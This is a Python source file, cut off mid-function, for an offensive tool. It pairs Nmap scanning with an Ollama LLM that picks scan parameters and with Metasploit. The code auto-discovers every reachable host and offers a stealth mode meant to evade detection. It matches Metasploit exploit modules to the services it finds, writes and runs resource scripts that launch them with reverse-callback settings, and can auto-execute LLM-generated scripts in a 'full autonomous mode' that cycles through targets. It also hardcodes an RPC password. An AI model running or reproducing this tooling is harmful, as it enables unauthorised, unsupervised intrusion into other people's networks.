#!/usr/bin/env python3
# Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration
# This script combines Nmap scanning with Ollama LLM for adaptive reconnaissance
# and optionally integrates with Metasploit for exploitation

import os
import sys
import time
import json
import socket
import random
import logging
import argparse
import ipaddress
import datetime
import subprocess
import threading
import traceback
import re
import netifaces
import requests
import nmap
import multiprocessing
import tempfile
import stat
import signal

from typing import List, Dict, Any, Optional, Tuple

# Set up logging
logger = logging.getLogger("adaptive_scanner")
logger.setLevel(logging.INFO)

# Add console handler if not already added
if not logger.handlers:
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

class NetworkDiscovery:
    """Class to handle automatic network discovery."""
    
    def __init__(self, interface=None, network=None, timeout=1):
        self.interface = interface
        self.network = network  # Can be specified in CIDR notation (e.g., "192.168.1.0/24")
        self.timeout = timeout
        
    def get_interface_info(self):
        """Get information about the selected network interface."""
        try:
            # If interface is specified, use it
            if self.interface:
                if self.interface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(self.interface)
                    if netifaces.AF_INET in addrs:
                        ipinfo = addrs[netifaces.AF_INET][0]
                        return {
                            'interface': self.interface,
                            'addr': ipinfo['addr'],
                            'netmask': ipinfo.get('netmask', '255.255.255.0')
                        }
                    else:
                        logger.error(f"Interface {self.interface} has no IPv4 address")
                else:
                    logger.error(f"Interface {self.interface} not found")
            
            # If no interface is specified or the specified one is invalid, find default
            gws = netifaces.gateways()
            if 'default' in gws and netifaces.AF_INET in gws['default']:
                default_gw, default_iface = gws['default'][netifaces.AF_INET]
                addrs = netifaces.ifaddresses(default_iface)
                if netifaces.AF_INET in addrs:
                    ipinfo = addrs[netifaces.AF_INET][0]
                    self.interface = default_iface  # Save the found interface
                    return {
                        'interface': default_iface,
                        'addr': ipinfo['addr'],
                        'netmask': ipinfo.get('netmask', '255.255.255.0')
                    }
            
            # If still not found, try the first interface with an IPv4 address
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ipinfo = addrs[netifaces.AF_INET][0]
                    if ipinfo['addr'] != '127.0.0.1':  # Skip loopback
                        self.interface = iface  # Save the found interface
                        return {
                            'interface': iface,
                            'addr': ipinfo['addr'],
                            'netmask': ipinfo.get('netmask', '255.255.255.0')
                        }
            
            # If all else fails, fall back to localhost
            logger.warning("Could not find a suitable network interface, using localhost")
            return {
                'interface': 'lo',
                'addr': '127.0.0.1',
                'netmask': '255.0.0.0'
            }
            
        except Exception as e:
            logger.error(f"Error getting interface information: {str(e)}")
            logger.debug(traceback.format_exc())
            return {
                'interface': 'unknown',
                'addr': '127.0.0.1',
                'netmask': '255.255.255.0'
            }
    
    def get_network_cidr(self):
        """Get the network address in CIDR notation (e.g., 192.168.1.0/24)."""
        # If network is already specified, use it
        if self.network:
            return self.network
        
        try:
            # Get interface info
            interface_info = self.get_interface_info()
            ip = interface_info['addr']
            netmask = interface_info['netmask']
            
            # Convert IP and netmask to network address
            ip_obj = ipaddress.IPv4Address(ip)
            netmask_obj = ipaddress.IPv4Address(netmask)
            
            # Calculate network address
            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
            
            # Calculate prefix length from netmask
            prefix_len = bin(int(netmask_obj)).count('1')
            
            # Create CIDR notation
            cidr = f"{network_addr}/{prefix_len}"
            
            logger.info(f"Determined network: {cidr}")
            self.network = cidr
            return cidr
            
        except Exception as e:
            logger.error(f"Error calculating network CIDR: {str(e)}")
            logger.debug(traceback.format_exc())
            return "192.168.1.0/24"  # Default fallback
    
    def ping_host(self, host):
        """Check if a host is up using a ping."""
        try:
            if os.name == "nt":  # Windows
                ping_cmd = ["ping", "-n", "1", "-w", str(int(self.timeout * 1000)), host]
            else:  # Unix/Linux
                ping_cmd = ["ping", "-c", "1", "-W", str(int(self.timeout)), host]
                
            result = subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return result.returncode == 0
            
        except Exception as e:
            logger.debug(f"Error pinging {host}: {str(e)}")
            return False
    
    def get_all_hosts(self):
        """Get all possible hosts in the network."""
        try:
            network_cidr = self.get_network_cidr()
            network = ipaddress.IPv4Network(network_cidr, strict=False)
            
            # Get all hosts in the network (excluding network address and broadcast)
            hosts = [str(host) for host in network.hosts()]
            
            return hosts
        except Exception as e:
            logger.error(f"Error getting hosts from network: {str(e)}")
            logger.debug(traceback.format_exc())
            return []
    
    def discover_hosts(self):
        """Discover active hosts in the network using parallel pings."""
        logger.info("Starting host discovery...")
        
        try:
            # Get all possible hosts
            all_hosts = self.get_all_hosts()
            
            if not all_hosts:
                logger.warning("No hosts found in network")
                return []
            
            logger.info(f"Scanning {len(all_hosts)} potential hosts in {self.network}...")
            
            # Use multiprocessing to speed up discovery
            active_hosts = []
            
            # Handle smaller networks directly
            if len(all_hosts) <= 256:
                with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
                    results = pool.map(self.ping_host, all_hosts)
                    active_hosts = [host for host, is_up in zip(all_hosts, results) if is_up]
            else:
                # For larger networks, process in batches
                batch_size = 256
                for i in range(0, len(all_hosts), batch_size):
                    batch = all_hosts[i:i+batch_size]
                    with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
                        results = pool.map(self.ping_host, batch)
                        active_hosts.extend([host for host, is_up in zip(batch, results) if is_up])
                    
                    logger.info(f"Processed {i+len(batch)}/{len(all_hosts)} hosts, found {len(active_hosts)} active")
            
            # Add our own IP to the list if not already there
            own_ip = self.get_interface_info().get('addr')
            if own_ip and own_ip not in active_hosts and own_ip != "127.0.0.1":
                active_hosts.append(own_ip)
            
            logger.info(f"Host discovery complete. Found {len(active_hosts)} active hosts.")
            return active_hosts
            
        except Exception as e:
            logger.error(f"Error during host discovery: {str(e)}")
            logger.debug(traceback.format_exc())
            
            # Try to at least return our own IP
            try:
                own_ip = self.get_interface_info().get('addr')
                if own_ip and own_ip != "127.0.0.1":
                    return [own_ip]
            except:
                pass
                
            return []

    def discover_networks(self):
        """Discover additional networks connected to this host."""
        try:
            # Get all interfaces
            networks = []
            for iface in netifaces.interfaces():
                # Skip loopback
                if iface == 'lo':
                    continue
                
                # Get addresses for this interface
                if netifaces.AF_INET in netifaces.ifaddresses(iface):
                    for addr_info in netifaces.ifaddresses(iface)[netifaces.AF_INET]:
                        if 'addr' in addr_info and 'netmask' in addr_info:
                            ip = addr_info['addr']
                            netmask = addr_info['netmask']
                            
                            # Skip localhost
                            if ip.startswith('127.'):
                                continue
                                
                            # Calculate network CIDR
                            ip_obj = ipaddress.IPv4Address(ip)
                            netmask_obj = ipaddress.IPv4Address(netmask)
                            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
                            prefix_len = bin(int(netmask_obj)).count('1')
                            cidr = f"{network_addr}/{prefix_len}"
                            
                            if cidr not in networks:
                                networks.append(cidr)
            
            return networks
            
        except Exception as e:
            logger.error(f"Error discovering networks: {str(e)}")
            logger.debug(traceback.format_exc())
            return []
    
    def alternative_host_discovery(self):
        """Alternative method to discover hosts using Nmap ARP scan."""
        try:
            logger.info("Using Nmap ARP scan for host discovery")
            
            # Use nmap to perform ARP scan
            nm = nmap.PortScanner()
            network_cidr = self.get_network_cidr()
            
            # Run ARP scan
            nm.scan(hosts=network_cidr, arguments='-sn -PR')
            
            # Extract hosts
            hosts = [host for host in nm.all_hosts() if host != '']
            
            if hosts:
                logger.info(f"Nmap ARP scan found {len(hosts)} hosts")
                return hosts
            else:
                logger.warning("Nmap ARP scan found no hosts")
                return []
                
        except Exception as e:
            logger.error(f"Error in alternative host discovery: {str(e)}")
            logger.debug(traceback.format_exc())
            return []

class AdaptiveNmapScanner:
    """Adaptive Nmap scanner that uses LLMs to optimize scan strategies."""
    
    def __init__(
        self,
        target=None,
        ollama_model="qwen2.5-coder:7b",
        max_iterations=3,
        continuous=False,
        delay=2,
        enable_msf=False,
        auto_exploit=False,
        msf_workspace="adaptive_scan",
        stealth_mode=False,
        auto_script=False,
        full_auto=False,
        auto_discover=False,
        interface=None,
        custom_scripts=False,
        execute_scripts=False
    ):
        # Target settings
        self.target = target
        self.auto_discover = auto_discover
        self.all_discovered_hosts = []
        self.discovered_hosts = []
        self.current_target_index = 0
        self.interface = interface
        self.running = True  # Flag for graceful termination
        
        # Ollama settings
        self.ollama_model = ollama_model
        
        # Scan settings
        self.max_iterations = max_iterations
        self.continuous = continuous
        self.delay = delay
        self.stealth_mode = stealth_mode
        self.full_auto = full_auto
        
        # Metasploit settings
        self.enable_msf = enable_msf
        self.auto_exploit = auto_exploit
        self.msf_workspace = msf_workspace
        self.auto_script = auto_script
        self.msf_client = None
        
        # Script generation settings
        self.custom_scripts = custom_scripts
        self.execute_scripts = execute_scripts
        self.generated_scripts_dir = os.path.join(os.getcwd(), "generated_scripts")
        if not os.path.exists(self.generated_scripts_dir):
            os.makedirs(self.generated_scripts_dir)
        
        # Network discovery
        if auto_discover:
            self.network_discovery = NetworkDiscovery(interface=interface)
        else:
            self.network_discovery = None
        
        # State tracking
        self.scan_history = []
        self.discovered_services = {}
        self.matching_exploits = {}
        self.successful_exploits = []
        self.generated_scripts = []
        self.ai_generated_scripts = []
        
        # Configure logger based on debug flag
        self.logger = logger
        
        # Log initialization
        logger.info(f"Initialized Adaptive Nmap Scanner")
        if target:
            logger.info(f"Initial target: {target}")
        if auto_discover:
            logger.info(f"Auto-discovery enabled")
        if custom_scripts:
            logger.info(f"AI script generation enabled")
            if execute_scripts:
                logger.info(f"Automatic script execution enabled")
        
        # Set up signal handler for clean termination
        signal.signal(signal.SIGINT, self._signal_handler)
        
        # If auto-discovery is enabled, perform it now
        if self.auto_discover:
            self._discover_network()
        
        # Initialize Metasploit if enabled
        if self.enable_msf:
            self.setup_metasploit()
    
    def _discover_network(self):
        """Discover the network and hosts."""
        logger.info("Starting network discovery process")
        
        self.network_discovery = NetworkDiscovery(self.interface)
        
        # Get network information
        interface_info = self.network_discovery.get_interface_info()
        logger.info(f"Local IP: {interface_info['addr']}, Netmask: {interface_info['netmask']}")
        
        # Get network CIDR
        network_cidr = self.network_discovery.get_network_cidr()
        logger.info(f"Network CIDR: {network_cidr}")
        
        # Discover other networks
        self.networks = self.network_discovery.discover_networks()
        if self.networks:
            networks_str = ', '.join(self.networks)
            logger.info(f"Discovered additional networks: {networks_str}")
        
        # Discover hosts
        logger.info("Discovering hosts on the network(s)...")
        
        # Start with the primary network
        discovered = self.network_discovery.discover_hosts()
        
        # Try alternative discovery if primary method finds no hosts
        if not discovered:
            logger.info("Primary discovery method found no hosts, trying alternative method")
            discovered = self.network_discovery.alternative_host_discovery()
        
        # Remove local IP from the list if present
        if interface_info['addr'] in discovered:
            discovered.remove(interface_info['addr'])
        
        self.discovered_hosts = discovered
        
        if discovered:
            logger.info(f"Discovered {len(discovered)} hosts: {', '.join(discovered[:5])}" + 
                        (f"... and {len(discovered)-5} more" if len(discovered) > 5 else ""))
            
            # If no target was specified, set the first discovered host as the target
            if not self.target and self.discovered_hosts:
                self.target = self.discovered_hosts[0]
                logger.info(f"No target specified, using first discovered host: {self.target}")
        else:
            logger.warning("No hosts discovered on the network")
            if not self.target:
                logger.error("No target specified and no hosts discovered. Exiting.")
                sys.exit(1)
    
    def next_target(self) -> bool:
        """Move to the next target in the list of discovered hosts."""
        if not self.discovered_hosts:
            return False
            
        self.current_target_index += 1
        if self.current_target_index >= len(self.discovered_hosts):
            logger.info("Reached the end of the target list")
            return False
            
        # Reset state for the new target
        self.target = self.discovered_hosts[self.current_target_index]
        self.scan_history = []
        self.iteration = 0
        self.discovered_services = {}
        
        logger.info(f"Moving to next target: {self.target}")
        return True
    
    def _signal_handler(self, sig, frame):
        """Handle CTRL+C to gracefully terminate the scanning process."""
        logger.warning("Received termination signal. Finishing current scan and exiting...")
        self.running = False
    
    def setup_metasploit(self):
        """Set up Metasploit connection and workspace."""
        try:
            # Import pymetasploit3 only when needed
            from pymetasploit3.msfrpc import MsfRpcClient
            
            logger.info("Connecting to Metasploit RPC server...")
            
            # Try to connect to Metasploit RPC
            try:
                self.msf_client = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=True)
                logger.info("Connected to Metasploit RPC server")
            except:
                # If connection fails, try to start msfrpcd
                logger.info("Could not connect to msfrpcd. Starting msfrpcd service...")
                subprocess.run(
                    ["msfrpcd", "-P", "msf_password", "-S", "-a", "127.0.0.1", "-p", "55553"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    start_new_session=True
                )
                
                # Wait for service to start
                time.sleep(5)
                
                # Try to connect again
                self.msf_client = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=True)
                logger.info("Connected to Metasploit RPC server")
            
            # Create or select workspace
            if self.msf_workspace not in self.msf_client.db.workspaces.list:
                logger.info(f"Creating Metasploit workspace: {self.msf_workspace}")
                self.msf_client.db.workspaces.add(self.msf_workspace)
            
            logger.info(f"Using Metasploit workspace: {self.msf_workspace}")
            self.msf_client.db.workspaces.set(self.msf_workspace)
            
            return True
        except ImportError:
            logger.error("pymetasploit3 not installed. Metasploit integration will not work.")
            logger.error("Install with: pip install pymetasploit3")
            self.enable_msf = False
            return False
        except Exception as e:
            logger.error(f"Error setting up Metasploit: {str(e)}")
            logger.debug(traceback.format_exc())
            self.enable_msf = False
            return False

    def process_results_with_metasploit(self, result):
        """Process the Nmap scan results with Metasploit."""
        if not self.msf_client or not result:
            return
        
        try:
            target = self.target
            if target not in result.get('scan', {}):
                logger.warning(f"Target {target} not found in scan results")
                return
            
            host_data = result['scan'][target]
            
            # Create or update host in MSF database
            logger.info(f"Importing host {target} to Metasploit database")
            
            # Get hostname
            hostname = 'unknown'
            if 'hostnames' in host_data and host_data['hostnames']:
                hostname = host_data['hostnames'][0].get('name', 'unknown')
            
            # Add host to database
            try:
                self.msf_client.db.hosts.report(target, name=hostname)
                logger.info(f"Added host {target} to Metasploit database")
            except Exception as e:
                logger.warning(f"Error adding host to Metasploit: {str(e)}")
            
            # Process open ports
            for protocol in ['tcp', 'udp']:
                if protocol in host_data:
                    for port, port_data in host_data[protocol].items():
                        if port_data['state'] == 'open':
                            service = port_data.get('name', 'unknown')
                            product = port_data.get('product', '')
                            version = port_data.get('version', '')
                            
                            # Add service to database
                            try:
                                self.msf_client.db.services.report(
                                    target, 
                                    port=int(port),
                                    proto=protocol,
                                    name=service,
                                    info=f"{product} {version}".strip()
                                )
                                logger.info(f"Added service {service} on {port}/{protocol} to Metasploit database")
                                
                                # Add to discovered services
                                port_key = f"{port}/{protocol}"
                                self.discovered_services[port_key] = {
                                    "service": service,
                                    "product": product,
                                    "version": version,
                                    "exploited": False
                                }
                            except Exception as e:
                                logger.warning(f"Error adding service to Metasploit: {str(e)}")
            
            # If auto-exploit enabled, find matching exploits
            if self.auto_exploit:
                self.find_matching_exploits()
            
            # If auto-script enabled, generate and run resource script
            if self.auto_script and self.matching_exploits:
                script_path = self.generate_resource_script()
                if script_path:
                    self.run_resource_script(script_path)
        
        except Exception as e:
            logger.error(f"Error processing results with Metasploit: {str(e)}")
            logger.debug(traceback.format_exc())

    def find_matching_exploits(self):
        """Find matching exploits for discovered services."""
        if not self.msf_client or not self.discovered_services:
            return
        
        logger.info("Finding matching exploits for discovered services...")
        
        for port_key, service_info in self.discovered_services.items():
            service = service_info['service']
            product = service_info['product']
            version = service_info['version']
            
            if service == 'unknown':
                continue
            
            search_terms = []
            
            # Different search strategies based on service
            if product:
                # Search by product and version if available
                search_terms.append(f"{product} {version}".strip())
                search_terms.append(product)
            
            # Always include service name
            search_terms.append(service)
            
            # Common services have special searches
            if service in ['http', 'https', 'www']:
                search_terms.append('web')
            elif service in ['smb', 'microsoft-ds']:
                search_terms.extend(['smb', 'windows', 'microsoft'])
            elif service in ['ssh', 'openssh']:
                search_terms.extend(['ssh', 'openssh'])
            elif service in ['ftp']:
                search_terms.extend(['ftp', 'file transfer'])
            
            # Search for each term
            exploits = set()
            for term in search_terms:
                try:
                    search_result = self.msf_client.modules.search(term)
                    for exploit in search_result:
                        # Check if it's a usable exploit or auxiliary module
                        if exploit['type'] in ['exploit', 'auxiliary'] and 'path' in exploit:
                            exploits.add(exploit['path'])
                except Exception as e:
                    logger.warning(f"Error searching for exploits: {str(e)}")
            
            # Store matching exploits
            if exploits:
                self.matching_exploits[port_key] = list(exploits)
                logger.info(f"Found {len(exploits)} potential exploits for {service} on {port_key}")
            else:
                logger.info(f"No exploits found for {service} on {port_key}")
        
        # Log total exploits found
        total_exploits = sum(len(exploits) for exploits in self.matching_exploits.values())
        logger.info(f"Found a total of {total_exploits} potential exploits across all services")

    def generate_resource_script(self):
        """Generate a Metasploit resource script for automated exploitation."""
        if not self.matching_exploits:
            logger.info("No matching exploits to generate resource script")
            return None
        
        try:
            # Create a timestamp for the script name
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            script_name = f"auto_exploit_{timestamp}.rc"
            
            logger.info(f"Generating Metasploit resource script: {script_name}")
            
            with open(script_name, 'w') as f:
                f.write(f"# Auto-generated Metasploit resource script for {self.target}\n")
                f.write(f"# Generated: {timestamp}\n\n")
                
                # Set workspace
                f.write(f"workspace {self.msf_workspace}\n\n")
                
                # Try each exploit for each service
                for port_key, exploits in self.matching_exploits.items():
                    port, protocol = port_key.split('/')
                    service_info = self.discovered_services[port_key]
                    service = service_info['service']
                    
                    f.write(f"# Exploits for {service} on port {port}/{protocol}\n")
                    
                    # Limit to top 3 exploits per service to avoid taking too long
                    for exploit in exploits[:3]:
                        f.write(f"use {exploit}\n")
                        f.write(f"set RHOSTS {self.target}\n")
                        f.write(f"set RPORT {port}\n")
                        
                        # Set common options
                        f.write("set LHOST 0.0.0.0\n")  # This will be replaced with actual local IP
                        f.write("set LPORT 4444\n")
                        
                        # Run exploit with default options
                        f.write("exploit -z\n")
                        
                        # Pause between exploits
                        f.write("sleep 3\n\n")
                
                # Final commands
                f.write("sessions -l\n")
                f.write("# End of script\n")
            
            # Record the script
            self.generated_scripts.append(script_name)
            logger.info(f"Generated resource script: {script_name}")
            
            return script_name
        
        except Exception as e:
            logger.error(f"Error generating resource script: {str(e)}")
            logger.debug(traceback.format_exc())
            return None

    def run_resource_script(self, script_path):
        """Run a Metasploit resource script."""
        if not os.path.exists(script_path):
            logger.error(f"Resource script not found: {script_path}")
            return
        
        try:
            logger.info(f"Running Metasploit resource script: {script_path}")
            
            # Update LHOST in script with local IP
            with open(script_path, 'r') as f:
                content = f.read()
            
            local_ip = self._get_local_ip()
            if local_ip:
                content = content.replace("set LHOST 0.0.0.0", f"set LHOST {local_ip}")
                
                with open(script_path, 'w') as f:
                    f.write(content)
            
            # Run msfconsole with resource script
            command = f"msfconsole -q -r {script_path}"
            logger.info(f"Executing: {command}")
            
            # Run in background to avoid blocking
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait a bit to see if it starts
            time.sleep(2)
            logger.info(f"Started Metasploit process with PID: {process.pid}")
            
            # Don't wait for completion to avoid blocking the script
            # This means the script will continue running in background
        
        except Exception as e:
            logger.error(f"Error running resource script: {str(e)}")
            logger.debug(traceback.format_exc())

    def run_exploits_on_host(self, target):
        """Run all matching exploits against a host."""
        if not self.msf_client or not self.matching_exploits:
            return
        
        logger.info(f"Running exploits against target: {target}")
        
        # Run each exploit through resource script
        script_path = self.generate_resource_script()
        if script_path:
            self.run_resource_script(script_path)
            
            # Mark all services as exploitation attempted
            for port_key in self.matching_exploits.keys():
                if port_key in self.discovered_services:
                    self.discovered_services[port_key]['exploitation_attempted'] = True

    def _get_local_ip(self):
        """Get the local IP address."""
        try:
            # First try to get the interface for the default route
            if self.network_discovery:
                return self.network_discovery.get_interface_info().get('addr')
            
            # Fallback method
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            logger.warning("Could not determine local IP address")
            return "127.0.0.1"

    def run(self):
        """Start the adaptive scanning process."""
        try:
            # Set up Metasploit if enabled
            if self.enable_msf:
                self.setup_metasploit()
            
            # If auto-discovery enabled, try to find targets first
            if self.auto_discover and self.network_discovery:
                logger.info("Starting network discovery")
                if not self.target:
                    discovered_hosts = self.network_discovery.discover_hosts()
                    if not discovered_hosts:
                        logger.error("No hosts discovered. Please check your network connection or specify a target.")
                        return
                    
                    logger.info(f"Discovered {len(discovered_hosts)} hosts: {', '.join(discovered_hosts)}")
                    self.target = discovered_hosts[0]  # Start with the first host
                    self.all_discovered_hosts = discovered_hosts
                    
                    logger.info(f"Selected initial target: {self.target}")
                else:
                    # User specified a target but still wants auto-discovery
                    self.all_discovered_hosts = self.network_discovery.discover_hosts()
                    logger.info(f"User-specified target: {self.target}")
                    if self.all_discovered_hosts:
                        logger.info(f"Also discovered {len(self.all_discovered_hosts)} additional hosts")
                        # Add user target if not in the list
                        if self.target not in self.all_discovered_hosts:
                            self.all_discovered_hosts.append(self.target)
            
            # Log startup information
            logger.info(f"Starting adaptive Nmap scan against {self.target}")
            logger.info(f"Using Ollama model: {self.ollama_model}")
            logger.info(f"Delay between scans: {self.delay} seconds")
            
            if self.continuous:
                logger.info("Running in continuous mode. Press Ctrl+C to stop.")
            else:
                logger.info(f"Maximum iterations: {self.max_iterations}")
                
            if self.enable_msf:
                logger.info("Metasploit integration: ENABLED")
                if self.auto_exploit:
                    logger.info("Automatic exploitation: ENABLED")
                if self.auto_script:
                    logger.info("Auto script generation: ENABLED")
                    
            if self.stealth_mode:
                logger.info("Stealth mode: ENABLED")
            
            if self.full_auto:
                logger.info("FULL AUTONOMOUS MODE: ENABLED")
            
            if self.custom_scripts:
                logger.info("AI-POWERED SCRIPT GENERATION: ENABLED")
                if self.execute_scripts:
                    logger.info("AUTOMATIC SCRIPT EXECUTION: ENABLED")
            
            # Begin adaptive scanning process
            iteration = 1
            scripts_generated = 0
            
            should_continue = True
            while should_continue and self.running:
                # Check if we've reached the maximum iterations
                if not self.continuous and iteration > self.max_iterations:
                    logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
                    should_continue = False
                else:
                    logger.info(f"\n{'=' * 50}")
                    logger.info(f"Starting scan iteration {iteration} on {self.target}")
                    logger.info(f"{'=' * 50}")
                    
                    # Generate scan parameters
                    scan_params = self.generate_scan_parameters(iteration)
                    result = self.run_nmap_scan(scan_params)
                    
                    if result:
                        # Update scan history
                        self.scan_history.append({
                            "iteration": iteration,
                            "target": self.target,
                            "params": scan_params,
                            "result_summary": self.summarize_results(result)
                        })
                        
                        # Process results with Metasploit if enabled
                        if self.enable_msf:
                            self.process_results_with_metasploit(result)
                            
                            if self.auto_exploit:
                                self.run_exploits_on_host(self.target)
                    
                    # Generate custom scripts if enabled and we have enough data
                    if self.custom_scripts and iteration >= 2 and scripts_generated < 3:
                        # Determine best script type based on discovered services
                        script_type = self.determine_best_script_type()
                        
                        logger.info(f"Generating custom {script_type} script for {self.target}...")
                        script_path = self.generate_custom_script(script_type=script_type)
                        
                        if script_path:
                            scripts_generated += 1
                            
                            # Execute the script if requested
                            if self.execute_scripts:
                                logger.info(f"Automatically executing generated script: {script_path}")
                                script_args = [self.target]
                                self.execute_generated_script(script_path, script_args)
                            else:
                                logger.info(f"Script generated but not executed. To run: {script_path} {self.target}")
                
                    # In full auto mode, we might want to switch to another target
                    if self.full_auto and self.all_discovered_hosts:
                        # Every few iterations, switch to another host
                        if iteration % 3 == 0 and len(self.all_discovered_hosts) > 1:
                            current_index = self.all_discovered_hosts.index(self.target) if self.target in self.all_discovered_hosts else -1
                            next_index = (current_index + 1) % len(self.all_discovered_hosts)
                            self.target = self.all_discovered_hosts[next_index]
                            logger.info(f"Switching to next target: {self.target}")
                        
                        # Every 5 iterations, rediscover the network to find new hosts
                        if iteration % 5 == 0 and self.network_discovery:
                            logger.info("Re-discovering network for new hosts...")
                            new_hosts = self.network_discovery.discover_hosts()
                            
                            # Find truly new hosts
                            actually_new = [h for h in new_hosts if h not in self.all_discovered_hosts]
                            if actually_new:
                                logger.info(f"Discovered {len(actually_new)} new hosts: {', '.join(actually_new)}")
                                self.all_discovered_hosts.extend(actually_new)
                
                    iteration += 1
                    
                    # Check again before waiting to avoid unnecessary delay
                    if not self.continuous and iteration > self.max_iterations:
                        logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
                        should_continue = False
                    else:
                        logger.info(f"Waiting {self.delay} seconds before next scan...")
                        time.sleep(self.delay)
            
        except KeyboardInterrupt:
            logger.info("\nScan interrupted by user. Exiting...")
        except Exception as e:
            logger.error(f"Error during scan: {str(e)}")
            logger.debug(traceback.format_exc())
        finally:
            # Show summary of generated scripts
            if self.custom_scripts and self.ai_generated_scripts:
                logger.info(f"\nGenerated {len(self.ai_generated_scripts)} AI scripts:")
                for script in self.ai_generated_scripts:
                    logger.info(f"  - {script}")
            
            # Clean up resources
            if self.msf_client:
                try:
                    self.msf_client.disconnect()
                    logger.info("Disconnected from Metasploit")
                except:
                    pass

    def determine_best_script_type(self):
        """Determine the best script type based on discovered services."""
        if not self.discovered_services:
            return "bash"  # Default to bash if no services discovered
        
        # Count service types
        web_services = 0
        database_services = 0
        windows_services = 0
        
        for port_key, service_info in self.discovered_services.items():
            service = service_info.get('service', '').lower()
            
            if service in ['http', 'https', 'www', 'apache', 'nginx', 'iis', 'tomcat']:
                web_services += 1
            elif service in ['mysql', 'postgresql', 'mssql', 'oracle', 'db2']:
                database_services += 1
            elif service in ['smb', 'microsoft-ds', 'netbios', 'ldap', 'kerberos']:
                windows_services += 1
        
        # Choose script type based on discovered services
        if web_services > database_services and web_services > windows_services:
            return "python"  # Python is good for web services
        elif database_services > web_services and database_services > windows_services:
            return "ruby"    # Ruby for database services (like in Metasploit)
        else:
            return "bash"    # Bash for general purpose or Windows services

    def generate_scan_parameters(self, iteration):
        """Generate scan parameters based on current iteration and history."""
        # For first iteration, use basic or stealth scan
        if iteration == 1:
            if self.stealth_mode:
                # Use stealthy scan parameters to avoid detection
                return [
                    "-sS",                 # SYN scan
                    "-T2",                 # Timing template (2 = "polite")
                    "--data-length=15",    # Add random data to packets
                    "--randomize-hosts",   # Scan hosts in random order
                    "--max-retries=1",     # Limit retry attempts
                    "--scan-delay=0.5s",   # Add delay between probes
                    "--min-rate=10",       # Limit packet rate
                    "--reason",            # Show reason for service state
                    "-p-",                 # Scan all ports
                    self.target            # Target IP/host
                ]
            else:
                # Regular initial scan
                return [
                    "-sS",                 # SYN scan
                    "-T4",                 # Timing template (4 = "aggressive")
                    "--min-rate=1000",     # Minimum packet rate
                    "-p-",                 # All ports
                    "--open",              # Only show open ports
                    self.target            # Target IP/host
                ]
        
        # For subsequent iterations, consult with Ollama
        if not self.scan_history:
            # Fallback if somehow we don't have history
            return self.generate_scan_parameters(1)
        
        # Prepare context for Ollama based on scan history
        context = self.prepare_ollama_context()
        
        # Get next scan strategy from Ollama
        prompt = f"""Given the previous Nmap scan results, recommend the next optimal Nmap scan parameters for a {iteration}{'st' if iteration == 1 else 'nd' if iteration == 2 else 'rd' if iteration == 3 else 'th'} iteration scan against {self.target}.

Previous scan information:
{context}

Provide ONLY the Nmap command line parameters (without 'nmap' prefix) for the next scan to gain more information about the target, discover services and potential vulnerabilities.
{'Use stealthy techniques to avoid detection.' if self.stealth_mode else ''}
"""

        # Get response from Ollama
        logger.info("Asking Ollama for next scan strategy...")
        response = self.query_ollama(prompt)
        
        if not response:
            logger.warning("Failed to get response from Ollama, using default parameters")
            # Use a default strategy based on iteration
            if iteration == 2:
                # Service detection on discovered ports
                open_ports = self.get_open_ports_from_history()
                port_spec = f"-p {open_ports}" if open_ports else "-p-"
                return ["-sV", "-O", "--version-all", port_spec, self.target]
            else:
                # Vulnerability scan
                return ["-sV", "-O", "--script=vuln", "--version-all", self.target]
        
        # Parse Ollama response to get Nmap parameters
        scan_params = self.parse_ollama_response(response)
        
        # Make sure we always have the target at the end
        if self.target not in scan_params:
            scan_params.append(self.target)
        
        logger.info(f"Generated scan parameters: {' '.join(scan_params)}")
        return scan_params

    def run_nmap_scan(self, scan_params):
        """Run an Nmap scan with the given parameters and return the result."""
        try:
            logger.info(f"Running Nmap scan with parameters: {' '.join(scan_params)}")
            
            # Remove target from params as nmap_scan() expects it separately
            params = [p for p in scan_params if p != self.target]
            target = self.target
            
            # Initialize nmap scanner
            nm = nmap.PortScanner()
            
            # Execute scan with parameters
            logger.debug(f"Executing: nmap {' '.join(params)} {target}")
            result = nm.scan(hosts=target, arguments=' '.join(params))
            
            if target in nm.all_hosts():
                host_info = nm[target]
                logger.info(f"Scan completed: {len(host_info.get('tcp', {}))} TCP ports and {len(host_info.get('udp', {}))} UDP ports found")
                return result
            else:
                logger.warning(f"No results found for target {target}")
                return None
            
        except nmap.PortScannerError as e:
            logger.error(f"Nmap scan error: {str(e)}")
            return None
        except Exception as e:
            logger.error(f"Error during Nmap scan: {str(e)}")
            logger.debug(traceback.format_exc())
            return None

    def summarize_results(self, result):
        """Create a summary of the scan results for history."""
        if not result or 'scan' not in result:
            return "No results"
        
        target = self.target
        if target not in result['scan']:
            return "Target not found in results"
        
        host_data = result['scan'][target]
        
        summary = {
            "hostname": host_data.get('hostnames', [{'name': 'unknown'}])[0]['name'],
            "state": host_data.get('status', {}).get('state', 'unknown'),
            "open_ports": {}
        }
        
        # Collect TCP ports
        if 'tcp' in host_data:
            for port, port_data in host_data['tcp'].items():
                if port_data['state'] == 'open':
                    summary['open_ports'][f"{port}/tcp"] = {
                        "service": port_data.get('name', 'unknown'),
                        "product": port_data.get('product', ''),
